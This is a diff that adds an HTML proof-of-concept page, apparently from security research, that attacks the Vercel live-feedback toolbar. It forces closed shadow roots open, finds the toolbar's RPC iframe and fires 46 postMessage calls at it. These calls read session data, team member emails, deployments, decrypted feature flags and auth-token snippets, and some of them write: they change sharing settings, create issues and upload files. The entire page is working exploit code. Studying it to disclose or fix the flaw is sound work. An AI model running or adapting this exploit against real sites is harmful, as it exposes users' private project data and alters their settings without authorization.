@@ -1,0 +1,366 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Toolbar RPC PoC - Full Enumeration</title>
+<script>
+(() => {
+  const TAG = 'yb-q3-' + Date.now();
+  window.__ybQ3 = {
+    tag: TAG,
+    stage: 'init',
+    shadows: [],
+    messages: [],
+    rpcResults: {},
+    log: [],
+    summary: {}
+  };
+  function log(msg) {
+    const ts = new Date().toISOString();
+    window.__ybQ3.log.push(ts + ' ' + msg);
+    const el = document.getElementById('q3-log');
+    if (el) {
+      const line = document.createElement('div');
+      line.textContent = ts + ' ' + msg;
+      el.appendChild(line);
+      el.scrollTop = el.scrollHeight;
+    }
+  }
+  window.__ybQ3.log_fn = log;
+
+  // Monkey-patch attachShadow
+  const origAttachShadow = Element.prototype.attachShadow;
+  Element.prototype.attachShadow = function(init) {
+    const shadow = origAttachShadow.call(this, {...init, mode: 'open'});
+    window.__ybQ3.shadows.push({tag: this.tagName, time: Date.now()});
+    log('attachShadow: ' + this.tagName + ' mode=' + init.mode + '->open');
+    return shadow;
+  };
+  log('Patch installed');
+
+  // Listen for ALL postMessages
+  window.addEventListener('message', event => {
+    if (!event.data || typeof event.data !== 'object') return;
+    const type = String(event.data.type || '');
+    window.__ybQ3.messages.push({
+      origin: event.origin, type: type,
+      id: String(event.data.id || event.data.replyId || ''),
+      ts: Date.now()
+    });
+
+    // Capture ALL replies
+    const msgId = event.data.id || event.data.replyId;
+    if (type === 'live-frame-reply' && msgId) {
+      const resultStr = String(JSON.stringify(event.data.result) || 'undefined').slice(0, 1000);
+      const errorStr = String(JSON.stringify(event.data.error) || 'undefined').slice(0, 500);
+      log('REPLY id=' + msgId + ' result=' + resultStr + ' error=' + errorStr);
+
+      window.__ybQ3.rpcResults[msgId] = {
+        result: event.data.result,
+        error: event.data.error,
+        origin: event.origin,
+        receivedAt: Date.now()
+      };
+
+      updateDisplay();
+    }
+
+    // Capture auth-response messages
+    if (type === 'auth-response') {
+      log('AUTH-RESPONSE received! Keys: ' + Object.keys(event.data).join(','));
+      window.__ybQ3.rpcResults._authResponse = {
+        hasAuth: !!event.data.auth,
+        hasToken: !!(event.data.auth && event.data.auth.token),
+        tokenSnippet: (event.data.auth?.token || '').slice(0, 30) + '...',
+        sessionKeys: Object.keys(event.data.auth?.session || {})
+      };
+    }
+
+    // Capture init-reply
+    if (type === 'init-reply') {
+      log('INIT-REPLY received! Keys: ' + Object.keys(event.data).join(','));
+      window.__ybQ3.rpcResults._initReply = {
+        keys: Object.keys(event.data),
+        dataSnippet: JSON.stringify(event.data).slice(0, 500)
+      };
+    }
+  });
+
+  function updateDisplay() {
+    const el = document.getElementById('q3-results');
+    if (!el) return;
+    const results = window.__ybQ3.rpcResults;
+    let handled = 0, unhandled = 0, errored = 0, noReply = 0;
+    let html = '';
+
+    // Group by category
+    const cats = {
+      'DATA READS': [],
+      'WRITES / STATE MUTATIONS': [],
+      'FLAG OPERATIONS': [],
+      'BISECT OPERATIONS': [],
+      'MICROFRONTEND': [],
+      'INFRASTRUCTURE': [],
+      'TRACKING': [],
+      'OTHER': []
+    };
+
+    for (const [key, val] of Object.entries(results)) {
+      if (key.startsWith('_')) continue;
+      const rpcName = key.replace(TAG + '-', '');
+      const hasResult = val.result !== null && val.result !== undefined;
+      const hasError = val.error !== null && val.error !== undefined;
+      const noHandler = hasError && JSON.stringify(val.error).includes('No handler');
+
+      let cat = 'OTHER';
+      if (rpcName.startsWith('get-') || rpcName === 'session' || rpcName === 'list-bisects' || rpcName === 'screenshot') cat = 'DATA READS';
+      else if (rpcName.startsWith('update-') || rpcName.startsWith('create-') || rpcName === 'upload-image' || rpcName === 'upload-snapshot' || rpcName === 'report-overrides' || rpcName === 'logout') cat = 'WRITES / STATE MUTATIONS';
+      else if (rpcName.includes('flag') || rpcName.includes('decrypt') || rpcName.includes('encrypt')) cat = 'FLAG OPERATIONS';
+      else if (rpcName.includes('bisect') || rpcName === 'initiate-bisect') cat = 'BISECT OPERATIONS';
+      else if (rpcName.includes('microfrontend')) cat = 'MICROFRONTEND';
+      else if (rpcName.includes('pusher') || rpcName === 'toolbar-data' || rpcName === 'extension-user-settings') cat = 'INFRASTRUCTURE';
+      else if (rpcName.startsWith('track-')) cat = 'TRACKING';
+
+      let color = 'gray';
+      let status = 'pending';
+      if (noHandler) { color = '#666'; status = 'NO HANDLER'; unhandled++; }
+      else if (hasResult && !hasError) { color = '#0f0'; status = 'DATA'; handled++; }
+      else if (hasError) { color = '#f80'; status = 'ERROR'; errored++; }
+      else { noReply++; }
+
+      cats[cat].push({rpcName, color, status, val});
+    }
+
+    for (const [catName, items] of Object.entries(cats)) {
+      if (items.length === 0) continue;
+      html += '<div style="margin:10px 0"><strong style="color:#0ff">' + catName + '</strong></div>';
+      for (const {rpcName, color, status, val} of items) {
+        html += '<div style="color:' + color + ';margin:3px 0;font-size:0.9em;">';
+        html += '  [' + status + '] <strong>' + rpcName + '</strong>: ';
+        if (val.result !== null && val.result !== undefined) {
+          html += JSON.stringify(val.result).slice(0, 300);
+        }
+        if (val.error) {
+          html += ' err=' + JSON.stringify(val.error).slice(0, 200);
+        }
+        html += '</div>';
+      }
+    }
+
+    const total = handled + unhandled + errored;
+    html = '<div style="margin-bottom:15px;padding:8px;border:1px solid #0ff;color:#0ff">' +
+      'Replies: ' + total + '/' + RPC_TYPES.length +
+      ' | Handled+data: ' + handled +
+      ' | Handled+error: ' + errored +
+      ' | No handler: ' + unhandled +
+      ' | Pending: ' + (RPC_TYPES.length - total) +
+      '</div>' + html;
+
+    el.innerHTML = html;
+
+    // Update summary
+    window.__ybQ3.summary = {handled, errored, unhandled, noReply, total};
+  }
+
+  // ==========================================
+  // COMPLETE RPC TYPE LIST (47 types from instrument.js Qv() dispatcher)
+  // ==========================================
+  const RPC_TYPES = [
+    // --- DATA READS ---
+    {type: 'session', payload: undefined, category: 'read', note: 'Returns userId, teamId, roomId, deployment info'},
+    {type: 'get-user-data', payload: undefined, category: 'read', note: 'User preferences/settings'},
+    {type: 'get-team-members', payload: {search: ''}, category: 'read', note: 'Team member list with emails'},
+    {type: 'get-production-domains', payload: undefined, category: 'read', note: 'All project production domains'},
+    {type: 'get-integrations', payload: undefined, category: 'read', note: 'Connected integrations list'},
+    {type: 'get-sharing-info', payload: {hostname: window.location.hostname}, category: 'read', note: 'Sharing/protection config'},
+    {type: 'get-emojis', payload: undefined, category: 'read', note: 'Custom emoji set'},
+    {type: 'get-og', payload: {path: '/'}, category: 'read', note: 'OG metadata for path'},
+    {type: 'get-snapshot', payload: {}, category: 'read', note: 'Deployment snapshot data'},
+    {type: 'get-speed-insights', payload: {route: '/'}, category: 'read', note: 'Speed insights for route'},
+    {type: 'get-deployments', payload: {limit: 10}, category: 'read', note: 'Deployment list with URLs, branches, build IDs'},
+    {type: 'screenshot', payload: undefined, category: 'read', note: 'Take deployment screenshot'},
+    {type: 'get-project-management-info', payload: {}, category: 'read', note: 'Project management integration info'},
+    {type: 'get-project-branches', payload: {}, category: 'read', note: 'Git branches for the project'},
+
+    // --- FLAG OPERATIONS (read) ---
+    {type: 'get-native-flags', payload: {}, category: 'read-flags', note: 'Feature flag definitions'},
+    {type: 'decrypt-flag-definitions', payload: {}, category: 'read-flags', note: 'Decrypted flag definitions'},
+    {type: 'decrypt-flag-values', payload: {}, category: 'read-flags', note: 'Decrypted flag runtime values'},
+    {type: 'decrypt-flag-overrides', payload: {}, category: 'read-flags', note: 'Decrypted flag override values'},
+    {type: 'get-shared-overrides', payload: {}, category: 'read-flags', note: 'Shared flag overrides'},
+    {type: 'get-recent-flag-overrides', payload: {pathname: '/'}, category: 'read-flags', note: 'Recent flag overrides for path'},
+    {type: 'flags-explorer-state', payload: {}, category: 'read-flags', note: 'Flags explorer UI state'},
+    // DANGER: Flag write RPCs excluded -- they trigger billing charges ($265 for Flags Explorer Unlimited Overrides)
+    // {type: 'generate-flags-secret', payload: undefined, category: 'write-flags', note: 'WRITE: Creates FLAGS_SECRET env var -- BILLING RISK'},
+    // {type: 'create-shared-overrides', payload: {overrides: {}}, category: 'write-flags', note: 'WRITE: Triggers Flags Explorer upgrade -- BILLING RISK'},
+    // {type: 'encrypt-flag-overrides', payload: {}, category: 'write-flags', note: 'WRITE: Encrypt and store flag overrides -- BILLING RISK'},
+    // {type: 'set-recommended-flag-overrides', payload: {}, category: 'write-flags', note: 'WRITE: Set recommended flag override config -- BILLING RISK'},
+    // {type: 'report-overrides', payload: {}, category: 'write-flags', note: 'WRITE: Report/log override activity -- BILLING RISK'},
+    // {type: 'flags-explorer-upgrade', payload: {}, category: 'write-flags', note: 'WRITE: Upgrade flags explorer tier -- BILLING RISK'},
+
+    // --- BISECT OPERATIONS ---
+    {type: 'initiate-bisect', payload: {}, category: 'write-bisect', note: 'WRITE: Start a deployment bisect'},
+    {type: 'list-bisects', payload: undefined, category: 'read-bisect', note: 'List active bisects'},
+    {type: 'get-bisect', payload: {id: 'test'}, category: 'read-bisect', note: 'Get specific bisect details'},
+    {type: 'update-bisect', payload: {id: 'test', action: 'cancel'}, category: 'write-bisect', note: 'WRITE: Update/cancel a bisect'},
+
+    // --- MICROFRONTEND ---
+    {type: 'get-microfrontend-config', payload: undefined, category: 'read-mfe', note: 'Microfrontend config'},
+    {type: 'get-microfrontend-metadata', payload: {}, category: 'read-mfe', note: 'Microfrontend metadata'},
+    {type: 'get-microfrontend-branches', payload: {}, category: 'read-mfe', note: 'Microfrontend project branches'},
+
+    // --- WRITES / STATE MUTATIONS ---
+    {type: 'update-user-data', payload: {}, category: 'write', note: 'WRITE: Update user preferences'},
+    {type: 'update-sharing-info', payload: {}, category: 'write', note: 'WRITE: Change sharing/protection settings'},
+    {type: 'create-issue', payload: {}, category: 'write', note: 'WRITE: Create project management issue'},
+    {type: 'update-tracing-opt-in', payload: {optInCookieValue: '', removeOldOptInCookie: false}, category: 'write', note: 'WRITE: Change tracing opt-in state'},
+    {type: 'upload-image', payload: {buffer: new ArrayBuffer(0), filename: 'test.png', mimeType: 'image/png', tempId: 'yb-test'}, category: 'write', note: 'WRITE: Upload image to comments'},
+    {type: 'upload-snapshot', payload: {snapshotId: 'yb-test', blob: new Blob([])}, category: 'write', note: 'WRITE: Upload deployment snapshot'},
+
+    // --- INFRASTRUCTURE ---
+    {type: 'toolbar-data', payload: {}, category: 'infra', note: 'Toolbar initialization data'},
+    {type: 'auth-pusher', payload: {socketId: 'yb-test', channels: ['presence-test']}, category: 'infra', note: 'Pusher auth for realtime channels'},
+    {type: 'pusher', payload: {}, category: 'infra', note: 'Pusher messaging'},
+    {type: 'extension-user-settings', payload: {}, category: 'infra', note: 'Browser extension settings (read)'},
+    {type: 'logout', payload: undefined, category: 'infra', note: 'WARNING: Session logout - fires but do not act on result'},
+
+    // --- TRACKING ---
+    {type: 'track-client', payload: {event: 'yb-q3-canary'}, category: 'tracking', note: 'Client analytics event'},
+    {type: 'track-recent', payload: {}, category: 'tracking', note: 'Track recent visit'},
+  ];
+
+  // SAFETY: Skip logout from auto-fire -- it would kill the session
+  const SAFE_RPC_TYPES = RPC_TYPES.filter(r => r.type !== 'logout');
+
+  let toolbarReady = false;
+  let pendingFrame = null;
+
+  window.addEventListener('message', function initHandler(event) {
+    if (event.data?.type === 'init-reply') {
+      log('Toolbar ready - sending ' + SAFE_RPC_TYPES.length + ' RPCs (excluding logout)');
+      toolbarReady = true;
+      if (pendingFrame) {
+        sendAllRPCs(pendingFrame);
+      }
+    }
+  });
+
+  function findAndFire() {
+    window.__ybQ3.stage = 'searching';
+    log('Searching for toolbar iframe...');
+    let attempts = 0;
+    const poll = setInterval(() => {
+      attempts++;
+      const host = document.querySelector('vercel-live-feedback');
+      if (!host) {
+        if (attempts >= 120) { clearInterval(poll); log('TIMEOUT: no toolbar'); return; }
+        if (attempts % 20 === 0) log('Waiting... ' + (attempts*500/1000) + 's');
+        return;
+      }
+      const sr = host.shadowRoot;
+      if (!sr) { log('No shadowRoot'); return; }
+      const iframes = sr.querySelectorAll('iframe');
+      let rpcFrame = null;
+      for (const f of iframes) {
+        if (f.src && f.src.includes('/_next-live/feedback/feedback.html')) {
+          rpcFrame = f;
+          break;
+        }
+      }
+      if (!rpcFrame) {
+        if (attempts >= 120) { clearInterval(poll); log('TIMEOUT: no iframe'); return; }
+        return;
+      }
+      clearInterval(poll);
+      log('Found iframe: ' + rpcFrame.src.slice(0, 100));
+      window.__ybQ3.stage = 'iframe-found';
+      if (toolbarReady) {
+        sendAllRPCs(rpcFrame);
+      } else {
+        pendingFrame = rpcFrame;
+        setTimeout(() => {
+          if (Object.keys(window.__ybQ3.rpcResults).filter(k => !k.startsWith('_')).length === 0) {
+            log('Safety timeout: sending without init-reply');
+            sendAllRPCs(rpcFrame);
+          }
+        }, 30000);
+      }
+    }, 500);
+  }
+
+  function sendAllRPCs(rpcFrame) {
+    log('Sending ' + SAFE_RPC_TYPES.length + ' RPCs (total types: ' + RPC_TYPES.length + ', logout excluded)...');
+    window.__ybQ3.stage = 'rpc-sent';
+    const origin = new URL(rpcFrame.src).origin;
+
+    SAFE_RPC_TYPES.forEach((rpc, i) => {
+      setTimeout(() => {
+        const id = TAG + '-' + rpc.type;
+        try {
+          rpcFrame.contentWindow.postMessage(
+            {type: rpc.type, replyId: id, payload: rpc.payload},
+            origin
+          );
+          log('Sent: ' + rpc.type);
+        } catch(e) {
+          log('ERROR sending ' + rpc.type + ': ' + e.message);
+        }
+      }, i * 200); // stagger 200ms apart
+    });
+
+    // Report final state after all RPCs + wait time
+    const waitMs = SAFE_RPC_TYPES.length * 200 + 20000;
+    setTimeout(() => {
+      window.__ybQ3.stage = 'complete';
+      const results = window.__ybQ3.rpcResults;
+      const rpcKeys = Object.keys(results).filter(k => !k.startsWith('_'));
+      const successful = rpcKeys.filter(k => results[k].result !== null && results[k].result !== undefined && !results[k].error);
+      const errored = rpcKeys.filter(k => results[k].error && !JSON.stringify(results[k].error).includes('No handler'));
+      const noHandler = rpcKeys.filter(k => results[k].error && JSON.stringify(results[k].error).includes('No handler'));
+      const noReply = SAFE_RPC_TYPES.length - rpcKeys.length;
+
+      log('COMPLETE: ' + rpcKeys.length + ' replies, ' + successful.length + ' data, ' +
+          errored.length + ' handled-error, ' + noHandler.length + ' no-handler, ' + noReply + ' no-reply');
+
+      window.__ybQ3.summary = {
+        total: rpcKeys.length,
+        data: successful.length,
+        handledError: errored.length,
+        noHandler: noHandler.length,
+        noReply: noReply,
+        dataTypes: successful.map(k => k.replace(TAG + '-', '')),
+        errorTypes: errored.map(k => k.replace(TAG + '-', '')),
+        noHandlerTypes: noHandler.map(k => k.replace(TAG + '-', ''))
+      };
+
+      updateDisplay();
+    }, waitMs);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', findAndFire);
+  } else {
+    findAndFire();
+  }
+})();
+</script>
+<style>
+body { font-family: monospace; padding: 20px; background: #1a1a2e; color: #e0e0e0; }
+h1 { color: #0ff; font-size: 1.5em; }
+h2 { color: #0ff; font-size: 1.1em; margin-top: 15px; }
+#q3-results { padding: 10px; margin: 10px 0; border: 1px solid #444; min-height: 50px; overflow-x: auto; }
+#q3-log { font-size: 0.75em; max-height: 300px; overflow-y: auto; border: 1px solid #333; padding: 5px; }
+#q3-log div { border-bottom: 1px solid #222; padding: 2px 0; }
+</style>
+</head>
+<body>
+<h1>Toolbar RPC PoC - Full Enumeration (47 types)</h1>
+<p>Tests all 47 RPC types extracted from instrument.js Qv() dispatcher against the toolbar iframe via postMessage.</p>
+<p>46 fired (logout excluded for safety). Read console: <code>window.__ybQ3.summary</code> for structured results.</p>
+<h2>Results</h2>
+<div id="q3-results">Waiting for toolbar...</div>
+<h2>Log</h2>
+<div id="q3-log"></div>
+</body>
+</html>
